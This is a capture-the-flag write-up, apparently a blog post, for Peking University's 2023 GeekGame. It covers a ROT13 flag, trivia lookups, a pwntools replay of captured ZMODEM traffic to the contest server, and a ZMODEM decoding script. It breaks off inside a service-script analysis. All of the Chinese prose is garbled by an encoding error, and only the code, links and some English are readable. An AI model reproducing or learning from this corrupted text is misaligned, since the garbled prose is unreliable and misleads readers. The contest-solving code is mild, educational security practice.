---
author: Xzonn
date: 2023-10-20
license: cc-by-nc 4.0
title: ç¬¬ä¸‰å±ŠåŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›ä¸ªäººé¢˜è§£
---
``` javascript
/*!
 * Title: ç¬¬ä¸‰å±ŠåŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›ä¸ªäººé¢˜è§£
 * Author: Xzonn
 * Date: 2023-10-20
 * License: CC-BY-NC 4.0
 */
```

æœ¬æ¥æ‰“ç®—åšä¸ªç­¾åˆ°é¢˜å°±èµ°ï¼Œä½†æ˜¯ä¸çŸ¥ä¸è§‰å°±åšä¸Šç˜¾äº†ï¼Œäºæ˜¯ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ã€‚å› ä¸ºçœŸæ­£å¼€å§‹ä»”ç»†ç¢ç£¨å¤§æ¦‚æ˜¯å‘¨äºŒï¼Œå¯¼è‡´æœ‰å‡ ä¸ªé¢˜æœ¬æ¥è‡ªå·±ä¹Ÿèƒ½åšå‡ºæ¥çš„ï¼Œä½†æ˜¯æ‹–åˆ°äº†å‘¨ä¸‰æ™šä¸Šå…­ç‚¹æ”¾æç¤ºä¹‹åæ‰æ‹¿åˆ°flagï¼Œç¨å¾®æœ‰ç‚¹äºã€‚

å› ä¸ºåšé¢˜çš„æ—¶å€™å†™çš„ä»£ç åŸºæœ¬ä¸Šæ˜¯â€œèƒ½ç”¨å°±è¡Œâ€ï¼Œæœ‰äº›ä¸­é—´æ­¥éª¤å·²ç»åˆ æ‰äº†ï¼Œå†™é¢˜è§£çš„æ—¶å€™é‡æ–°æ•´ç†äº†ä¸€éï¼ˆä¸»è¦æ˜¯æ”¹äº†ä¸€äº›æ¯”è¾ƒéšä¾¿çš„å‘½åï¼‰ï¼Œæ‰€ä»¥å¯èƒ½æœ‰äº›é”™è¯¯ã€‚

ï¼ˆUpdate v3ï¼šæŒ‰ç…§æ¯”èµ›å¹³å°æäº¤æ—¶çš„æç¤ºï¼Œå‚è€ƒé¢˜é¢å’Œå®˜æ–¹é¢˜è§£ï¼Œæˆæƒåè®®æ”¹ä¸º CC-BY-NC 4.0ï¼‰

## ä¸€çœ¼ç›¯å¸§
ç¥–ä¼ ç­¾åˆ°é¢˜ï¼Œä¸‹è½½é™„ä»¶ï¼Œç„¶åæ‹¿PhotoShopæ‰“å¼€GIFæ–‡ä»¶ï¼Œæ˜¾ç¤ºæ‰€æœ‰å¸§ï¼Œç„¶åæ¨¡å¼æ”¹ä¸ºâ€œå˜æš—â€ï¼Œå†å»æ‰ç¢äº‹çš„ç¬¬ä¸€å¸§ï¼Œå°±èƒ½å¾—åˆ°æ‹¼åœ¨ä¸€èµ·çš„ç»“æœï¼š

![æ¨¡å¼æ”¹ä¸ºâ€œå˜æš—â€](images/23-1.png)

![æ‹¼åˆåçš„ç»“æœ](images/23-2.png)

``` plaintext
synt{jrypbzrarjcynlref}
```

ç†Ÿæ‚‰çš„â€œsyntâ€ï¼Œåˆæ˜¯å‡¯æ’’å¯†ç ï¼ˆå¥½åƒè¿™ç©æ„å«ROT13ï¼‰ï¼Œéšä¾¿[æ‰¾ä¸ªç½‘ç«™](http://www.atoolbox.net/Tool.php?Id=778)è§£å¯†ä¸€ä¸‹ï¼š

``` plaintext
flag{welcomenewplayers}
```

## å°åŒ—é—®ç­”!!!!!
ç¥–ä¼ å°åŒ—é—®ç­”ï¼Œè¿™æ¬¡é¢˜ç›®å¥½åƒæ¯”ä¹‹å‰ç®€å•ä¸å°‘ï¼Œè€Œä¸”æäº¤é™åˆ¶æ˜¯ä¸€å°æ—¶ä¸€æ¬¡ï¼Œå¤šçŒœå‡ æ¬¡å°±èƒ½å¯¹äº†ã€‚å®é™…ä¸Šæˆ‘åªçŒœäº†3æ¬¡ã€‚

### 1. åœ¨åŒ—äº¬å¤§å­¦ï¼ˆæ ¡çº§ï¼‰é«˜æ€§èƒ½è®¡ç®—å¹³å°ä¸­ï¼Œä»€ä¹ˆå‘½ä»¤å¯ä»¥æäº¤ä¸€ä¸ªéäº¤äº’å¼ä»»åŠ¡ï¼Ÿ
æ‰¾åˆ°å®˜æ–¹[ä½¿ç”¨æ•™ç¨‹çš„è¯´æ˜](https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html)ï¼š

> è¿è¡Œä½œä¸šçš„æ–¹å¼æœ‰ä¸¤ç§ï¼š
> 
> ä¸€ç§æ˜¯å°†è®¡ç®—è¿‡ç¨‹å†™æˆè„šæœ¬ï¼Œé€šè¿‡sbatchæŒ‡ä»¤æäº¤åˆ°è®¡ç®—èŠ‚ç‚¹æ‰§è¡Œï¼›
> 
> å¦ä¸€ç§æ˜¯é€šè¿‡sallocç”³è¯·åˆ°è®¡ç®—èŠ‚ç‚¹ï¼Œå†sshè¿æ¥åˆ°è®¡ç®—èŠ‚ç‚¹è¿›è¡Œè®¡ç®—ï¼›

æ—¢ç„¶è¯´â€œéäº¤äº’å¼ä»»åŠ¡â€ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ç¬¬ä¸€ç§ï¼Œ`sbatch`ã€‚

### 2. æ ¹æ® GPL è®¸å¯è¯çš„è¦æ±‚ï¼ŒåŸºäº Linux äºŒæ¬¡å¼€å‘çš„æ“ä½œç³»ç»Ÿå†…æ ¸å¿…é¡»å¼€æºã€‚ä¾‹å¦‚å°ç±³å…¬å¸å¼€æºäº† Redmi K60 Ultra æ‰‹æœºçš„å†…æ ¸ã€‚å…¶å†…æ ¸ç‰ˆæœ¬å·æ˜¯ï¼Ÿ
è°·æ­Œæœç´¢â€œRedmi K60 Ultra Linux kernelâ€ï¼Œæ‰¾åˆ°å°ç±³å®˜æ–¹çš„[GitHubä»“åº“](https://github.com/MiCode/Xiaomi_Kernel_OpenSource)ï¼Œæœ€ä¸‹é¢ä¸€è¡Œå‘ç°â€œRedmi K60 Ultraâ€å¯¹åº”æ ‡ç­¾â€œcorot-s-ossâ€ã€‚ä½†è¿™ä¸ªä»“åº“æ²¡æœ‰â€œcorot-s-ossâ€åˆ†æ”¯ï¼Œåªæœ‰â€œcorot-t-ossâ€åˆ†æ”¯ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œä½†æ˜¯ä»æäº¤ä¿¡æ¯ä¸Šæ¥çœ‹ç¡®å®æ˜¯Redmi K60 Ultraçš„ä»“åº“ã€‚

æŸ¥çœ‹`Makefile`æ–‡ä»¶ï¼š

``` makefile
# SPDX-License-Identifier: GPL-2.0
VERSION = 5
PATCHLEVEL = 15
SUBLEVEL = 78
EXTRAVERSION =
NAME = Trick or Treat
```

ç­”æ¡ˆæ˜¯`5.15.78`ã€‚

### 3. æ¯æ¬¾è‹¹æœäº§å“éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„è¯†åˆ«åç§°ï¼ˆIdentifierï¼‰ï¼Œä¾‹å¦‚åˆä»£ iPhone æ˜¯ iPhone1,1ã€‚é‚£ä¹ˆ Apple Watch Series 8ï¼ˆèœ‚çªç‰ˆæœ¬ï¼Œ41mm å°ºå¯¸ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ
è°·æ­Œæœç´¢â€œiPhone1,1 Identifierâ€ï¼Œæ‰¾åˆ°ä¸€ä¸ª[Gist](https://gist.github.com/adamawolf/3048717)ï¼š

``` plaintext
Watch6,14 : Apple Watch Series 8 41mm case (GPS)
Watch6,15 : Apple Watch Series 8 45mm case (GPS)
Watch6,16 : Apple Watch Series 8 41mm case (GPS+Cellular)
Watch6,17 : Apple Watch Series 8 45mm case (GPS+Cellular)
```

æŒ‰ç…§è¦æ±‚çš„ç‰ˆæœ¬ï¼Œç­”æ¡ˆæ˜¯`Watch6,16`ã€‚

### 4. æœ¬å±Š PKU GeekGame çš„æ¯”èµ›å¹³å°ä¼šç¦æ­¢é€‰æ‰‹æ˜µç§°ä¸­åŒ…å«æŸäº›ç‰¹æ®Šå­—ç¬¦ã€‚æˆªæ­¢åˆ° 2023 å¹´ 10 æœˆ 1 æ—¥ï¼Œå…±ç¦æ­¢äº†å¤šå°‘ä¸ªå­—ç¬¦ï¼Ÿï¼ˆæç¤ºï¼šæœ¬é¢˜ç­”æ¡ˆä¸ Python ç‰ˆæœ¬æœ‰å…³ï¼Œä»¥å¹³å°å®é™…è¿è¡Œæƒ…å†µä¸ºå‡†ï¼‰
æ¯”èµ›å¹³å°å‰åç«¯éƒ½æ˜¯å¼€æºçš„ï¼Œåœ¨[åç«¯çš„ä»“åº“](https://github.com/PKU-GeekGame/gs-backend)æ‰¾åˆ°10æœˆ1æ—¥çš„æäº¤ç‰ˆæœ¬[`abbbbb7`](https://github.com/PKU-GeekGame/gs-backend/tree/abbbbb7222052fd8d15a5a4b6b802847eeaf95af)ï¼Œæœç´¢â€œæ˜µç§°â€ï¼Œå‘ç°å‡ è¡Œä»£ç ï¼š

``` python
EMOJI_CHARS = (
    {chr(0x200d)}  # zwj
    | {chr(0x200b)}  # zwsp, to break emoji componenets into independent chars
    | {chr(0x20e3)} # keycap
    | {chr(c) for c in range(0xfe00, 0xfe0f+1)} # variation selector
    | {chr(c) for c in range(0xe0020, 0xe007f+1)} # tag
    | {chr(c) for c in range(0x1f1e6, 0x1f1ff+1)} # regional indicator
)

# https://www.compart.com/en/unicode/category
DISALLOWED_CHARS = (
    unicode_chars('Cc', 'Cf', 'Cs', 'Mc', 'Me', 'Mn', 'Zl', 'Zp') # control and modifier chars
    | {chr(c) for c in range(0x12423, 0x12431+1)} # too long
    | {chr(0x0d78)} # too long
) - EMOJI_CHARS
WHITESPACE_CHARS = unicode_chars('Zs') | EMOJI_CHARS

@classmethod
def _deep_val_nickname(cls, name: str) -> Optional[str]:
    all_whitespace = True
    for c in name:
        if c in cls.DISALLOWED_CHARS:
            return f'æ˜µç§°ä¸­ä¸èƒ½åŒ…å«å­—ç¬¦ {hex(ord(c))}'
        if c not in cls.WHITESPACE_CHARS:
            all_whitespace = False
```

æ‹å‡ºæ¥è‡ªå·±å†™ä¸ª`test.py`ï¼š

``` python
from typing import Set
from unicategories import categories

def unicode_chars(*cats: str) -> Set[str]:
    ret = set()
    for cat in cats:
        ret |= set(categories[cat].characters())
    return ret

EMOJI_CHARS = (
    {chr(0x200d)}  # zwj
    | {chr(0x200b)}  # zwsp, to break emoji componenets into independent chars
    | {chr(0x20e3)} # keycap
    | {chr(c) for c in range(0xfe00, 0xfe0f+1)} # variation selector
    | {chr(c) for c in range(0xe0020, 0xe007f+1)} # tag
    | {chr(c) for c in range(0x1f1e6, 0x1f1ff+1)} # regional indicator
)

# https://www.compart.com/en/unicode/category
DISALLOWED_CHARS = (
    unicode_chars('Cc', 'Cf', 'Cs', 'Mc', 'Me', 'Mn', 'Zl', 'Zp') # control and modifier chars
    | {chr(c) for c in range(0x12423, 0x12431+1)} # too long
    | {chr(0x0d78)} # too long
) - EMOJI_CHARS
WHITESPACE_CHARS = unicode_chars('Zs') | EMOJI_CHARS

print(len(DISALLOWED_CHARS))
```

å®˜æ–¹æç¤ºè¯´è¿™ä¸ªæ•°å­—ä¸Pythonç‰ˆæœ¬æœ‰å…³ï¼Œæ‡’å¾—åœ¨æœ¬åœ°ä¸‹è½½Pythonï¼Œäºæ˜¯ç›´æ¥ä¸ŠGitHub Actionsï¼Œå†™ä¸ªWorkflowä¿å­˜ä¸º`.github/workflows/workflow.yml`ï¼š

``` yml
name: Build and Publish

on:
  push:
  workflow_call:

jobs:  
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.8", "3.9", "3.10", "3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v4
        with:
          python-version: ${{ matrix.python-version }}
      - run: |
          python -m pip install --upgrade pip
          pip install unicategories~=0.1.2
          python test.py
```

æ¨ä¸Šå»ï¼Œå¾—åˆ°ç»“æœï¼š

| ç‰ˆæœ¬ | ç»“æœ |
| ---- | ---- |
| 3.8  | 4445 |
| 3.9  | 4472 |
| 3.10 | 4472 |
| 3.11 | 4587 |
| 3.12 | 4636 |

è¿™ä¸ªåªèƒ½è¯•å‡ºæ¥ï¼Œç­”æ¡ˆæ˜¯`4445`ã€‚

### 5. åœ¨ 2011 å¹´ 1 æœˆï¼ŒBilibili æ¸¸æˆåŒºä¸‹å…±æœ‰å“ªäº›å­åˆ†åŒºï¼Ÿï¼ˆæŒ‰ç½‘ç«™æ˜¾ç¤ºé¡ºåºï¼Œä»¥åŠè§’é€—å·åˆ†éš”ï¼‰
é¦–å…ˆå…ˆå¾—æŸ¥å‡ºæ¥bilibiliåœ¨2011å¹´1æœˆä½¿ç”¨çš„åŸŸåæ˜¯â€œbilibili.usâ€ï¼ˆ[ç»´åŸºç™¾ç§‘](https://zh.wikipedia.org/wiki/Bilibili#%E7%BD%91%E7%AB%99%E6%94%B9%E7%89%88)ï¼‰ï¼Œç„¶åä»è¿›å…¥Wayback Machineçš„å­˜æ¡£ç½‘å€ï¼š<https://web.archive.org/web/201101/http://bilibili.us>ï¼Œæ‰¾åˆ°2011å¹´1æœˆçš„å­˜æ¡£ï¼Œå‘ç°æ¸¸æˆåŒºä¸‹é¢æœ‰è¿™äº›å­åˆ†åŒºï¼š

![å­˜æ¡£é¡µé¢](images/18-1.png)

ç­”æ¡ˆæ˜¯`æ¸¸æˆè§†é¢‘,æ¸¸æˆæ”»ç•¥Â·è§£è¯´,Mugen,flashæ¸¸æˆ`ã€‚

### 6. [è¿™ä¸ªç…§ç‰‡](https://prob18.geekgame.pku.edu.cn/static/osint-challenge.jpg)ä¸­å‡ºç°äº†ä¸€ä¸ªå¤§å‹å»ºç­‘ç‰©ï¼Œå®ƒçš„å®˜æ–¹ç½‘ç«™çš„åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿï¼ˆç…§ç‰‡ä¸­éƒ¨åˆ†ä¿¡æ¯å·²è¢«æœ‰æ„é®æŒ¡ï¼Œè¯·æ³¨æ„æ£€æŸ¥ç­”æ¡ˆæ ¼å¼ï¼‰
å…ˆè°·æ­Œæœç´¢æ——å­ä¸Šçš„å­—â€œå¯è¿ªæ§è‚¡ æ¸…åç§‘æŠ€å›­ ä¸­å…³æ‘ KONZA KACSTâ€ï¼Œå‘ç°[ä¸€ç¯‡æ–‡ç« ](http://www.iaspbo.com.cn/contents/2/533)ï¼š

![æ–‡ç« æˆªå›¾](images/18-2.png)

è¿™å‡ ä¸ªä¼ä¸šåéƒ½æ˜¯â€œIASP 2023â€çš„èµåŠ©å•†ï¼Œæ­£å¥½ç¬¬ä¸€è¡Œå°±æ˜¯å›¾ä¸Šçš„è¿™äº›æ ‡å¿—ï¼Œâ€œé‡‘é“¶é“œâ€ä¹Ÿéƒ½ä¸€æ ·ã€‚æ‰¾åˆ°[IASP 2023çš„å®˜ç½‘](https://www.iaspworldconference.com/)ï¼Œå…¶ä¸­[ä¸€ä¸ªé¡µé¢](https://www.iaspworldconference.com/destination/social-events/)æœ‰å¼ å›¾ï¼š

![é¡µé¢æˆªå›¾](images/18-3.png)

å’Œé¢˜ç›®ä¸Šçš„å›¾ååˆ†ç±»ä¼¼ã€‚æ ¹æ®è¯´æ˜ï¼Œè¿™é‡Œæ˜¯[å¢æ£®å ¡éŸ³ä¹å…](https://www.philharmonie.lu/)ï¼Œå‚è€ƒç­”æ¡ˆæ ¼å¼çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ­£ç¡®ç­”æ¡ˆæ˜¯`philharmonie.lu`ã€‚

## Z å…¬å¸çš„æœåŠ¡å™¨
### Flag 1ï¼šæœåŠ¡å™¨
ä¸‹è½½ä¸‹æ¥çš„é¢˜ç›®é™„ä»¶æ˜¯ä¸ª`.pcapng`æ–‡ä»¶ï¼Œä¹‹å‰æ²¡ç”¨è¿‡ï¼Œä½†æ˜¯è°·æ­Œä¸€ä¸‹å°±èƒ½è½»æ¾æ‰¾åˆ°ä¸€ä¸ªæ‰“å¼€å·¥å…·[Wireshark](https://www.wireshark.org/)ï¼Œå…è´¹ä½¿ç”¨ã€‚æ‰“å¼€ä¸€çœ‹ï¼Œé‡Œé¢æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„äº¤äº’ï¼š

![Wiresharkæˆªå›¾](images/15-1.png)

æ˜¾ç„¶`192.168.16.1`æ˜¯å®¢æˆ·ç«¯ï¼Œ`192.168.23.179`æ˜¯æœåŠ¡å™¨ï¼Œè™½ç„¶çœ‹ä¸æ‡‚å®ƒä»¬ä¿©åœ¨å¹²ä»€ä¹ˆï¼Œä¸è¿‡åªéœ€è¦æ¨¡æ‹Ÿå®¢æˆ·ç«¯å¾€æœåŠ¡ç«¯å‘é€åŒæ ·çš„æ•°æ®å°±è¡Œäº†ã€‚äºæ˜¯å†™ä¸ªPythonè„šæœ¬ï¼š

``` python
from pwn import *

conn = remote("prob05.geekgame.pku.edu.cn", 10005)
conn.recvuntil(b"Please input your token: ")
conn.send(b"<MY TOKEN>\n")
time.sleep(1)
conn.send(b"\x2a\x2a\x18\x42\x30\x31\x30\x30\x30\x30\x30\x30\x36\x33\x66\x36\x39\x34\x0a")
time.sleep(1)
conn.send(b"\x0a")
time.sleep(1)
conn.send(b"\x2a\x18\x43\x18\x44\x18\x40\x18\x40\x18\x40\x18\x40\xdd\x51\xa2\x33\x66\x6c\x61\x67\x2e\x6a\x70\x67\x18\x40\x31\x36\x30\x39\x36\x20\x31\x34\x35\x30\x35\x33\x33\x33\x35\x31\x35\x20\x31\x30\x30\x37\x37\x37\x20\x30\x20\x31\x20\x31\x36\x30\x39\x36\x18\x40\x18\x6b\xd6\x18\xcb\x33\x66\x11")
time.sleep(1)
conn.send(b"\x2a\x2a\x18\x42\x30\x31\x30\x30\x30\x30\x30\x30\x36\x33\x66\x36\x39\x34\x0a\x0a")
time.sleep(1)
print(conn.recv())
conn.send(b"\x2a\x2a\x18\x42\x30\x39\x30\x30\x30\x30\x30\x30\x30\x30\x61\x38\x37\x63\x0a\x0a")
with open("flag1.bin", "wb") as writer:
  writer.write(conn.recv())
```

æ‰§è¡Œå®Œä¹‹åä»`flag1.bin`é‡Œé¢å¯ä»¥æ‰¾åˆ°flagã€‚

### Flag 2ï¼šæµé‡åŒ…
è¿™é¢˜ç¡®å®æ˜¯çœ‹äº†æç¤ºæ‰åšå‡ºæ¥çš„ï¼Œè€Œä¸”æ˜¯æˆ‘åœ¨æ¯”èµ›æœ€åçš„ä¸¤ä¸ªå°æ—¶ã€åœ¨ä¹Œé²æœ¨é½å‡ºå·®çš„å‰æä¸‹åšå‡ºæ¥çš„ã€‚

æ ¹æ®æµé‡åŒ…å¯ä»¥æ‰¾åˆ°å‡ æ¡æ¯”è¾ƒé•¿çš„æ•°æ®ï¼ŒçŒœæµ‹è¿™ä¸ªå°±æ˜¯éœ€è¦åˆ†æçš„æ•°æ®ã€‚æŠŠè¿™äº›æ•°æ®æ‰‹åŠ¨æ‹·è´å‡ºæ¥ç²˜è´´åˆ°HxDé‡Œï¼Œå­˜æˆ`0001.bin`åˆ°`0008.bin`ã€‚åœ¨`0001.bin`çš„è¾ƒå‰é¢çš„éƒ¨åˆ†å¯ä»¥çœ‹åˆ°`JFIF`å‡ ä¸ªå­—æ¯ï¼Œç›´æ¥çŒœæµ‹æ˜¯`.jpg`æ–‡ä»¶çš„[æ–‡ä»¶å¤´](https://en.wikipedia.org/wiki/List_of_file_signatures)ï¼ˆä»å‰ä¸€æ¡æµé‡ä¹Ÿèƒ½çœ‹åˆ°æ–‡ä»¶åä¸º`flag.jpg`ï¼‰ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•æ‹¼å‡ºæ¥ä¸ªjpgæ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå¦‚æœç›´æ¥æŠŠ8ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ‹¼èµ·æ¥ï¼Œå¹¶ä¸”å»æ‰jpgæ–‡ä»¶å¤´å‰é¢çš„éƒ¨åˆ†æ˜¯æ˜¾ç¤ºä¸å‡ºæ¥ä»»ä½•ä¸œè¥¿çš„ã€‚

æ ¹æ®æç¤ºæ‰¾åˆ°[ZMODEMåè®®çš„è§„èŒƒ](https://gallium.inria.fr/~doligez/zmodem/zmodem.txt)ï¼Œé‡Œé¢å†™äº†ä¸€å¤§å †ï¼Œä½†æ˜¯æœ‰ç”¨çš„ä¸œè¥¿ä¸å¤šã€‚åŸæœ¬åˆ°è¿™é‡Œæˆ‘æ‰“ç®—æ”¾å¼ƒäº†ï¼Œä½†æ˜¯æ¯”èµ›æœ€ååˆ†æ•°æ¯”è¾ƒç„¦ç¼ï¼Œä¸ºäº†å†²ä¸€å†²ï¼Œæˆ‘å†³å®šå†è¯»ä¸€ä¸‹è§„èŒƒã€‚æœ€é‡è¦çš„éƒ¨åˆ†ä¸»è¦æ˜¯è¿™å‡ å¥è¯ï¼š

> The receiving program decodes any sequence of ZDLE followed by a byte with bit 6 set and bit 5 reset (upper case letter, either parity) to the equivalent control character by inverting bit 6. This allows the transmitter to escape any control character that cannot be sent by the communications medium. In addition, the receiver recognizes escapes for 0177 and 0377 should these characters need to be escaped.
>
> ï¼ˆæœºç¿»ï¼šæ¥æ”¶ç¨‹åºé€šè¿‡åè½¬ä½6ï¼Œå°†ZDLEçš„ä»»ä½•åºåˆ—è§£ç ä¸ºç­‰æ•ˆæ§åˆ¶å­—ç¬¦ï¼ŒZDLEåé¢è·Ÿç€ä¸€ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­ä½6è¢«è®¾ç½®ï¼Œä½5è¢«é‡ç½®ï¼ˆå¤§å†™å­—æ¯ï¼Œä»»ä¸€å¥‡å¶æ ¡éªŒï¼‰ã€‚è¿™å…è®¸å‘å°„å™¨é€ƒè„±é€šä¿¡ä»‹è´¨ä¸èƒ½å‘é€çš„ä»»ä½•æ§åˆ¶å­—ç¬¦ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦è½¬ä¹‰0177å’Œ0377çš„è¿™äº›å­—ç¬¦ï¼Œæ¥æ”¶å™¨ä¼šè¯†åˆ«è¿™äº›å­—ç¬¦çš„è½¬ä¹‰ã€‚ï¼‰
> 
> ZMODEM software escapes ZDLE, 020, 0220, 021, 0221, 023, and 0223. If preceded by 0100 or 0300 (@), 015 and 0215 are also escaped to protect the Telenet command escape CR-@-CR. The receiver ignores 021, 0221, 023, and 0223 characters in the data stream.
>
> ï¼ˆæœºç¿»ï¼šZMODEMè½¯ä»¶è½¬ä¹‰ZDLEã€020ã€0220ã€021ã€0221ã€023å’Œ0223ã€‚å¦‚æœå‰é¢æ˜¯0100æˆ–0300ï¼ˆ@ï¼‰ï¼Œ015å’Œ0215ä¹Ÿè¢«è½¬ä¹‰ä»¥ä¿æŠ¤Telenetå‘½ä»¤è½¬ä¹‰CR-@-CRã€‚æ¥æ”¶å™¨å¿½ç•¥æ•°æ®æµä¸­çš„021ã€0221ã€023å’Œ0223ä¸ªå­—ç¬¦ã€‚ï¼‰

è¿™è¯´æ˜è¿™ä¸ªä¼ è¾“è§„èŒƒä¼šå¯¹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„éƒ¨åˆ†å­—ç¬¦è½¬ä¹‰ï¼Œâ€œZDLEâ€æ˜¯è‡ªå®šä¹‰çš„è½¬ç§»æ§åˆ¶ç¬¦`0x18`ï¼Œè·Ÿåœ¨åé¢çš„å­—èŠ‚æ˜¯è¢«è½¬ä¹‰è¿‡çš„ï¼Œå…¶ç¬¬6ä½è¢«å–åã€‚äºæ˜¯å¯ä»¥ä»¥åŒæ ·çš„åŠæ³•ï¼Œå¯¹`0x18`åé¢ç´§è·Ÿçš„å­—èŠ‚å¯¹`0x40`ï¼ˆ`0b01000000`ï¼‰å–å¼‚æˆ–ï¼Œå¾—åˆ°åŸå§‹çš„å­—èŠ‚ã€‚å†™ä¸ªPythonè„šæœ¬ï¼š

``` python
import struct

result = b""

data = b""
for f in [1, 2, 3, 4, 5, 6, 7, 8]:
  with open(f"./{f:04d}.bin", "rb") as reader:
    data += reader.read()

data = data[data.index(b"\xFF\xD8\xFF\xE0"):]

i = 0
while i < len(data):
  c = data[i]
  if c == 0x18:
    if i + 1 >= len(data):
      break
    c = data[i + 1]
    c = c ^ 0x40
    result += struct.pack("B", c)
    i += 2
    continue
  else:
    result += struct.pack("B", c)
    i += 1
    continue

with open("out.jpg", "wb") as writer:
  writer.write(result[result.index(b"\xFF\xD8\xFF\xE0"):])
```

ä½†è¿™æ ·å¾—åˆ°çš„ç»“æœæ˜¯è¿™æ ·çš„ï¼š

![é¦–æ¬¡å°è¯•](images/15-2.jpg)

èƒ½çœ‹å‡ºæ¥ç¡®å®æœ‰å­—äº†ï¼Œä½†æ˜¯å¥½åƒè¿˜æ˜¯æœ‰äº›é”™è¯¯ã€‚ç»§ç»­çœ‹è§„èŒƒæœ‰äº›æ¥ä¸åŠï¼Œäºæ˜¯æˆ‘ä»ç”µè„‘é‡Œéšä¾¿æ‰¾äº†ä¸€ä¸ª`.jpg`æ–‡ä»¶ï¼Œç”¨`sz test.jpg`æŒ‡ä»¤è®©å®ƒå¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œç¼–ç ï¼Œç„¶åç”¨Pythonæ¨¡æ‹Ÿæ¥æ”¶ç«¯ï¼ŒæŠŠè·å–çš„å­—èŠ‚å­˜åœ¨æœ¬åœ°ï¼š

``` python
from pwn import *

context.log_level = "debug"
io = process(["sz", "test.jpg"])
time.sleep(1)
io.send(b"\x2a\x2a\x18\x42\x30\x31\x30\x30\x30\x30\x30\x30\x36\x33\x66\x36\x39\x34\x0a\x0a")
time.sleep(1)
io.recv()
io.send(b"\x2a\x2a\x18\x42\x30\x39\x30\x30\x30\x30\x30\x30\x30\x30\x61\x38\x37\x63\x0a\x0a")
time.sleep(1)

out = 1
while True:
  x = io.recv(timeout=5)
  if not x:
    break
  with open(f"test/{out:04d}.bin", "wb") as writer:
    writer.write(x)
  out += 1
io.close()
```

ç„¶åæ‹¿ä¸Šé¢çš„è„šæœ¬å¯¹è¿™ä¸ªè¾“å‡ºç»“æœè·‘ä¸€éï¼Œçœ‹çœ‹ä¸åŸæ¥çš„`.jpg`æ–‡ä»¶æœ‰ä»€ä¹ˆä¸åŒã€‚è·‘å®Œä¹‹åæ‹¿HxDçœ‹äº†ä¸€ä¸‹ï¼Œä»`0x400`è¿™é‡Œå¼€å§‹ä¸ä¸€æ ·ï¼š

![å¯¹æ¯”åŸå§‹æ–‡ä»¶å’Œè§£ç ç»“æœ](images/15-3.png)

å¯ä»¥çœ‹å‡ºæ¥æˆ‘çš„è§£ç ç»“æœå¤šäº†5ä¸ªå­—èŠ‚ï¼Œå¯èƒ½æ˜¯è§„èŒƒé‡Œæåˆ°çš„æ ¡éªŒç ã€‚æ‰‹åŠ¨åˆ æ‰è¿™5ä¸ªå­—èŠ‚ç»§ç»­æ¯”è¾ƒï¼Œå‘ç°åœ¨`0x800`å¤„ä¹Ÿå·®äº†5ä¸ªå­—èŠ‚ã€‚è¿™æ ·çš„è¯å°±æ¯”è¾ƒæ˜ç™½äº†ï¼Œä¿®æ”¹ä¸€ä¸‹è§£ç ç¨‹åºï¼š

``` python
remove = 0x405

i = 0
while i < len(data):
  if len(result) == remove:
    result = result[:-5]
    remove += 0x400
```

æ¯è§£ç `0x405`ä¸ªå­—èŠ‚å°±åˆ æ‰æœ€å5ä¸ªå­—èŠ‚ï¼Œæœ€åè¾“å‡ºçš„å›¾ç‰‡æ€»ç®—æ˜¯æ­£å¸¸äº†ï¼Œåªä¸è¿‡ä¸åŸå§‹æ–‡ä»¶å¥½åƒè¿˜æœ‰æœ€åå‡ ä¸ªå­—èŠ‚æ˜¯å¯¹ä¸ä¸Šçš„ï¼Œä½†æ˜¯ç®¡ä¸äº†è¿™ä¹ˆå¤šäº†ï¼Œ`.jpg`æ–‡ä»¶é”™äº†æœ€åå‡ ä¸ªå­—èŠ‚ä¹Ÿä¸å½±å“é˜…è¯»ï¼Œåæ­£åªè¦èƒ½è¯»å‡ºæ¥flagå°±è¡Œã€‚æ‹¿è¿™ä¸ªç¨‹åºå†è·‘ä¸€éé¢˜ç›®çš„æ•°æ®å°±èƒ½æ‹¿åˆ°`flag.jpg`è¯»å‡ºflagã€‚

## çŒ«å’ªçŠ¶æ€ç›‘è§†å™¨
è¿™é¢˜ä¸€å¼€å§‹æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†ç¬¬äºŒé˜¶æ®µæç¤ºæ‰æ˜ç™½çš„ã€‚

æ ¹æ®æç¤ºå’ŒDockerfileï¼Œè‡ªå·±åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªDockerï¼ŒæŠŠ`/usr/sbin/service`æ–‡ä»¶å¤åˆ¶å‡ºæ¥ï¼Œåˆ†æé€»è¾‘ï¼Œé‡Œé¢æ£€æµ‹äº†æ˜¯å¦æœ‰`/run/systemd/system`æˆ–`/run/openrc/started`ï¼Œè¿›åˆ°Dockeré‡Œé¢ä¸€æ‰¾ï¼Œä¸¤ä¸ªéƒ½æ²¡æœ‰ã€‚äºæ˜¯äº‹æƒ…å°±å˜å¾—ç®€å•äº†ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š

``` shell
run_via_sysvinit() {
   # Otherwise, use the traditional sysvinit
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
